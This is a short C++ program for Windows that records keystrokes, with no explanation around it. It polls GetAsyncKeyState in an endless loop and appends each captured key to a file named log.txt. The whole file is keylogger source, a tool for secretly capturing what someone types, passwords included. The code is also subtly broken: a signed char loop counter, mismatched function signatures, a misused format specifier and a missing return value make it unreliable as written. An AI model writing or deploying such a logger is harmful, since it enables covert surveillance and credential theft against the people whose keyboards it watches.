#include <fstream>
#include <Windows.h>
#include <iostream>

using namespace std;
int Save(int _key, char* file);

int main() {

	char i;

	while (true) {
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				Save(i, "log.txt");
			}
		}
	}
}

int Save(int _key, char const *file) {

	cout << _key << endl;

	FILE* OUTPUT_FILE;

	OUTPUT_FILE = fopen(file, "a+");
	fprintf(OUTPUT_FILE, "%s", &_key);
	fclose(OUTPUT_FILE);
}